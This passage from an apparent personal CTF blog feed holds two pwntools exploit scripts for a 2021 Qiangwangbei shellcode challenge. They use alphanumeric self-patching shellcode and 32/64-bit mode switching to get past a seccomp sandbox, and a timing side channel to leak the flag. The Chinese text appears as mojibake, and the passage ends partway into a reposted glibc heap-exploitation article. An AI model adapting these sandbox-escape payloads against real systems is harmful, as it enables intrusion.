class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./shellcode'</span>)<br><span class="hljs-comment"># p = remote("nc.eonew.cn","10011")</span><br>p.recvuntil(<span class="hljs-string">"shellcode: "</span>)<br><br>append_x86 = <span class="hljs-string">'''</span><br><span class="hljs-string">push ebx</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string">'''</span><br>append = <span class="hljs-string">'''</span><br><span class="hljs-string">/* æœºå™¨ç : 52 5a */</span><br><span class="hljs-string">push rdx</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">'''</span><br><br>shellcode_x86 = <span class="hljs-string">'''</span><br><span class="hljs-string">/*fp = open("flag")*/</span><br><span class="hljs-string">mov esp,0x40404140</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* s = "flag" */</span><br><span class="hljs-string">push 0x67616c66</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ebx = &amp;s */</span><br><span class="hljs-string">push esp</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ecx = 0 */</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov ecx,eax</span><br><span class="hljs-string">'''</span><br><br>shellcode_flag = <span class="hljs-string">'''</span><br><span class="hljs-string">/* retfq:  mode_32 -&gt; mode_64*/</span><br><span class="hljs-string">push 0x33</span><br><span class="hljs-string">push 0x40404089</span><br><span class="hljs-string">retfq</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*read(fp,buf,0x70)*/</span><br><span class="hljs-string">mov rdi,rcx</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">mov rdx,0x70</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*write(1,buf,0x70)*/</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">'''</span><br>shellcode_x86 = asm(shellcode_x86)<br>shellcode_flag = asm(shellcode_flag, arch = <span class="hljs-string">'amd64'</span>, os = <span class="hljs-string">'linux'</span>)<br>shellcode = <span class="hljs-string">''</span><br><br><span class="hljs-comment"># 0x40404040 ä¸º32ä½shellcodeåœ°å€</span><br>shellcode_mmap = <span class="hljs-string">'''</span><br><span class="hljs-string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span><br><span class="hljs-string">push 0x40404040 /*set rdi*/</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x7e /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdx*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x47</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set r8*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop r8</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rax /*set r9*/</span><br><span class="hljs-string">pop r9</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">/* syscall çš„æœºå™¨ç æ˜¯ 0f 05, éƒ½æ˜¯ä¸å¯æ‰“å°å­—ç¬¦. */</span><br><span class="hljs-string">/* ç”¨å¼‚æˆ–è¿ç®—æ¥è§£å†³è¿™ä¸ªé—®é¢˜: 0x0f = 0x5d^0x52, 0x05 = 0x5f^0x5a. */</span><br><span class="hljs-string">/* å…¶ä¸­ 0x52,0x5a ç”± append æä¾›. */</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x31],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x32],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x22 /*set rcx*/</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40/*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x49</span><br><span class="hljs-string">'''</span><br>shellcode_read = <span class="hljs-string">'''</span><br><span class="hljs-string">/*read(0,0x40404040,0x70)*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40404040 /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdi*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40 /*set rdx*/</span><br><span class="hljs-string">push 0x70</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x57],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x58],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rdx /*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x70</span><br><span class="hljs-string">'''</span><br><br>shellcode_retfq = <span class="hljs-string">'''</span><br><span class="hljs-string">/*mode_64 -&gt; mode_32*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x72</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x40],cl</span><br><span class="hljs-string">push 0x68</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x40],cl</span><br><span class="hljs-string">push 0x47</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x41],cl</span><br><span class="hljs-string">push 0x48</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x41],cl</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push 0x40404040</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">'''</span><br><br><span class="hljs-comment"># mmap</span><br>shellcode += shellcode_mmap<br>shellcode += append<br><br><span class="hljs-comment"># read shellcode</span><br>shellcode += shellcode_read<br>shellcode += append<br><br><span class="hljs-comment"># mode_64 -&gt; mode_32</span><br>shellcode += shellcode_retfq<br>shellcode += append<br><br>shellcode = asm(shellcode,arch = <span class="hljs-string">'amd64'</span>,os = <span class="hljs-string">'linux'</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode))<br><br><span class="hljs-comment">#gdb.attach(p,"b *0x40027f\nb*0x4002eb\nc\nc\nsi\n")</span><br>p.sendline(shellcode)<br>pause()<br><br>p.sendline(shellcode_x86 + <span class="hljs-number">0x29</span>*<span class="hljs-string">'\x90'</span> + shellcode_flag)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h3 id="R-ç¼º-OW-ä¾‹é¢˜-2021-å¼ºç½‘æ¯-åˆèµ›-shellcode"><a href="#R-ç¼º-OW-ä¾‹é¢˜-2021-å¼ºç½‘æ¯-åˆèµ›-shellcode" class="headerlink" title="R ç¼º OW (ä¾‹é¢˜: 2021-å¼ºç½‘æ¯-åˆèµ›-shellcode)"></a>R ç¼º OW (ä¾‹é¢˜: 2021-å¼ºç½‘æ¯-åˆèµ›-shellcode)</h3><p>è¿™é“é¢˜å…¶å®å°±æ˜¯ â€œR ç¼º OWâ€ï¼Œä¸Šé¢ä¸¤ç§æƒ…å†µçš„èåˆæ€ªã€‚</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># context.log_level = 'debug'</span><br><br>append_x86 = <span class="hljs-string">'''</span><br><span class="hljs-string">push ebx</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string">'''</span><br>append = <span class="hljs-string">'''</span><br><span class="hljs-string">push rdx</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">'''</span><br><br>shellcode_x86 = <span class="hljs-string">'''</span><br><span class="hljs-string">/*fp = open("flag")*/</span><br><span class="hljs-string">mov esp,0x40404140</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* s = "flag" */</span><br><span class="hljs-string">push 0x67616c66</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ebx = &amp;s */</span><br><span class="hljs-string">push esp</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ecx = 0 */</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov ecx,eax</span><br><span class="hljs-string">'''</span><br>shellcode_x86 = asm(shellcode_x86)<br><br>shellcode_mmap = <span class="hljs-string">'''</span><br><span class="hljs-string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span><br><span class="hljs-string">push 0x40404040 /*set rdi*/</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x7e /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdx*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x47</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set r8*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop r8</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rax /*set r9*/</span><br><span class="hljs-string">pop r9</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x31],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x32],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x22 /*set rcx*/</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40/*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x49</span><br><span class="hljs-string">'''</span><br>shellcode_read = <span class="hljs-string">'''</span><br><span class="hljs-string">/*read(0,0x40404040,0x70)*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40404040 /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdi*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40 /*set rdx*/</span><br><span class="hljs-string">push 0x70</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x57],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x58],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rdx /*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x70</span><br><span class="hljs-string">'''</span><br><br>shellcode_retfq = <span class="hljs-string">'''</span><br><span class="hljs-string">/*mode_64 -&gt; mode_32*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x72</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x40],cl</span><br><span class="hljs-string">push 0x68</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x40],cl</span><br><span class="hljs-string">push 0x47</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x41],cl</span><br><span class="hljs-string">push 0x48</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x41],cl</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push 0x40404040</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">'''</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p, index, ch</span>):<br>    shellcode = <span class="hljs-string">''</span><br><br>    <span class="hljs-comment"># mmap</span><br>    shellcode += shellcode_mmap<br>    shellcode += append<br><br>    <span class="hljs-comment"># read shellcode</span><br>    shellcode += shellcode_read<br>    shellcode += append<br><br>    <span class="hljs-comment"># mode_64 -&gt; mode_32</span><br>    shellcode += shellcode_retfq<br>    shellcode += append<br><br>    shellcode = asm(shellcode,arch = <span class="hljs-string">'amd64'</span>,os = <span class="hljs-string">'linux'</span>)<br>    <span class="hljs-comment">#print hex(len(shellcode))</span><br><br>    p.sendline(shellcode)<br>    time.sleep(<span class="hljs-number">0.05</span>)<br><br>    shellcode_flag =<span class="hljs-string">"""</span><br><span class="hljs-string">    push 0x33</span><br><span class="hljs-string">    push 0x40404089</span><br><span class="hljs-string">    retfq</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    /*read(fp,buf,0x70)*/</span><br><span class="hljs-string">    mov rdi,rcx</span><br><span class="hljs-string">    mov rsi,rsp</span><br><span class="hljs-string">    mov rdx,0x70</span><br><span class="hljs-string">    xor rax,rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    loop:</span><br><span class="hljs-string">    cmp byte ptr[rsi+{0}], {1}</span><br><span class="hljs-string">    jz loop</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">    """</span>.<span class="hljs-built_in">format</span>(index, ch)<br>    shellcode_flag = asm(shellcode_flag,arch = <span class="hljs-string">'amd64'</span>,os = <span class="hljs-string">'linux'</span>)<br><br>    p.sendline(shellcode_x86 + <span class="hljs-number">0x29</span>*<span class="hljs-string">'\x90'</span> + shellcode_flag)<br><br>flag = <span class="hljs-string">""</span><br>index = <span class="hljs-number">0</span><br>last = <span class="hljs-string">'a'</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    update = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        sh = process(<span class="hljs-string">"./shellcode"</span>)<br>        pwn(sh, index, ch)<br>        start = time.time()<br>        <span class="hljs-keyword">try</span>:<br>            sh.recv(timeout=<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        end = time.time()<br>        sh.close()<br>        <span class="hljs-keyword">if</span>(end-start &gt; <span class="hljs-number">1.5</span>):<br>            flag += <span class="hljs-built_in">chr</span>(ch)<br>            last = <span class="hljs-built_in">chr</span>(ch)<br>            update = <span class="hljs-literal">True</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[ flag + 1 !!! ] "</span> + flag)<br>            <span class="hljs-keyword">break</span><br>    <br>    <span class="hljs-keyword">assert</span>(update == <span class="hljs-literal">True</span>)<br>    <br>    <span class="hljs-keyword">if</span>(last == <span class="hljs-string">'}'</span>):<br>        <span class="hljs-keyword">break</span><br>    <br>    index += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">"flag: "</span> + flag)<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ€è¿‘å¤ç°å¼ºç½‘æ¯2021èµ›é¢˜[shellcode]æœ‰æ„Ÿï¼Œç‰¹æ„æ¥å­¦ä¹ ä¸€ä¸‹æœ‰å…³orwåŸç†ä¸­ç¼ºå°‘æŸäº›å‡½æ•°çš„æƒ…å†µå¦‚ä½•è¿›è¡ŒORW&lt;br&gt;ç¦ç”¨æ²™ç®±è§„åˆ™æˆ‘åœ¨ä¹‹å‰æåˆ°è¿‡ [[prctl-seccomp]]&lt;br&gt;å‚è€ƒäº†å¤§ä½¬!&lt;a href=&quot;https://www.jianshu.com/p</summary>
      
    
    
    
    <category term="pwn è¿›é˜¶" scheme="https://kylinxin.github.io/categories/pwn-%E8%BF%9B%E9%98%B6/"/>
    
    
    <category term="orw" scheme="https://kylinxin.github.io/tags/orw/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://kylinxin.github.io/2023/11/26/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/"/>
    <id>https://kylinxin.github.io/2023/11/26/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/</id>
    <published>2023-11-26T02:17:40.844Z</published>
    <updated>2023-11-26T02:33:21.986Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Glibcå †åˆ©ç”¨ä¹‹house of ç³»åˆ—</title>
    <link href="https://kylinxin.github.io/2023/11/25/Glibc%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse%20of%20%E7%B3%BB%E5%88%97/"/>
    <id>https://kylinxin.github.io/2023/11/25/Glibc%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse%20of%20%E7%B3%BB%E5%88%97/</id>
    <published>2023-11-25T15:14:29.000Z</published>
    <updated>2023-11-26T07:17:41.049Z</updated>
    
    <content type="html"><![CDATA[<p>è½¬è½½è‡ª<a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#1-%E5%89%8D%E8%A8%80">Glibcå †åˆ©ç”¨ä¹‹house ofç³»åˆ—æ€»ç»“ - roderick - record and learn! (roderickchan.cn)</a></p><h1 id="1-å‰è¨€"><a href="#1-å‰è¨€" class="headerlink" title="1 - å‰è¨€"></a>1 - å‰è¨€</h1><p><code>Glibc</code> çš„ <code>house of</code> ç³»åˆ—æ”»å‡»æ‰‹æ³•åŸºäºéƒ½æ˜¯å›´ç»•ç€å †åˆ©ç”¨å’Œ <code>IO FILE</code> åˆ©ç”¨ã€‚è¿˜æœ‰å¾ˆå¤šå †åˆ©ç”¨æ‰‹æ³•ä¹Ÿéå¸¸ç»å…¸ï¼Œä½†æ˜¯ç”±äºå…¶æ²¡æœ‰è¢«å† ä»¥ <code>house of xxxx</code>ï¼Œæ•…æ²¡æœ‰æ”¶å½•åˆ°æœ¬æ–‡ä¸­ã€‚å¦‚æœæƒ³å­¦ä¹ æ‰€æœ‰çš„è¯¦ç»†çš„å †æ”»å‡»æ‰‹æ³•ï¼Œå¼ºçƒˆå»ºè®® <code>follow</code> ä»“åº“ <a href="https://github.com/shellphish/how2heap">how2heap</a>è¿›è¡Œå­¦ä¹ ã€‚æˆ‘ç›¸ä¿¡ï¼Œåªè¦æŠŠ <code>how2heap</code> é‡Œé¢çš„æ¯ä¸€ä¸ªå †åˆ©ç”¨æ‰‹æ³•éƒ½å­¦æ‡‚å­¦é€äº†ï¼Œ<code>glibc</code> å †åˆ©ç”¨ä½ å°†å°½åœ¨æŒæ¡ã€‚</p><p>åœ¨å¼€å§‹ç³»åˆ—æ€»ç»“ä¹‹å‰ï¼Œæˆ‘ä¼šç»™å‡ºä¸€ä¸ªè¡¨æ ¼ï¼Œè¡¨æ ¼é‡Œé¢åˆ†åˆ«æ˜¯ <code>house of xxxx</code> å’Œå¯¹åº”çš„ä¼˜ç§€çš„è§£ææ–‡ç« ï¼Œåœ¨æ­¤éå¸¸æ„Ÿè°¢å„ä½å¸ˆå‚…ä»¬çš„æ€»ç»“ã€‚å¦‚æœä½ åœ¨é˜…è¯»æœ¬æ–‡çš„è¿‡ç¨‹ä¸­æƒ³å®Œæ•´åœ°æŸ¥çœ‹æŸä¸€ä¸ªæ‰‹æ³•åœ°è¯¦ç»†åˆ©ç”¨è¿‡ç¨‹ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥å›åˆ°è¡¨æ ¼ï¼Œç‚¹å‡»å¯¹åº”çš„é“¾æ¥è¿›è¡Œå­¦ä¹ ã€‚ç›®å‰çš„æœ€æ–°ç‰ˆæœ¬ä¸º <code>2.37</code>ï¼Œä½†æ˜¯ï¼Œç›®å‰çš„ <code>ubuntu:23.04</code> è¿˜æ²¡å¼€å§‹ç”¨ <code>glibc-2.37</code>ï¼Œä½¿ç”¨çš„ä»ç„¶æ˜¯ <code>glibc-2.36</code>ã€‚</p><p>å¦‚æœè¿˜æœ‰å“ªäº› <code>house of xxxx</code> çš„åˆ©ç”¨æ‰‹æ³•æ²¡æœ‰æ”¶å½•è¿›æ¥ï¼Œæˆ–ä½ å¯¹æœ¬æ–‡å­˜æœ‰ä¸€äº›ç–‘é—®ï¼Œæˆ–è€…ä½ å‘ç°æœ¬æ–‡æŸäº›å†…å®¹ç¼–å†™é”™è¯¯ï¼Œè¿˜è¯·ç•™è¨€æŒ‡æ­£ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé™¤äº†å…³æ³¨å„ç§ <code>house of</code> åˆ©ç”¨æŠ€å·§æœ¬èº«ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œéœ€è¦å…³æ³¨è¯¥åˆ©ç”¨æŠ€å·§èƒŒåçš„æ€æƒ³å’ŒåŸç†ã€‚å¦‚æœä½ èƒ½ä»è¿™ä¸€ç³»åˆ—çš„åˆ©ç”¨æ‰‹æ³•ä¸­æç‚¼å‡ºä¸€äº›é€šç”¨çš„æ”»å‡»å‘é‡æˆ–è€…æ”»å‡»æ€æƒ³ï¼Œæ—¥ååœ¨é¢å¯¹å…¶ä»–çš„åœºæ™¯ï¼Œä½ ä¹Ÿèƒ½æ›´å¿«çš„æ‰¾åˆ°ç³»ç»Ÿçš„æ¼æ´ç‚¹å¹¶åŠ ä»¥åˆ©ç”¨ã€‚å­¦ä¹  <code>glibc</code> å 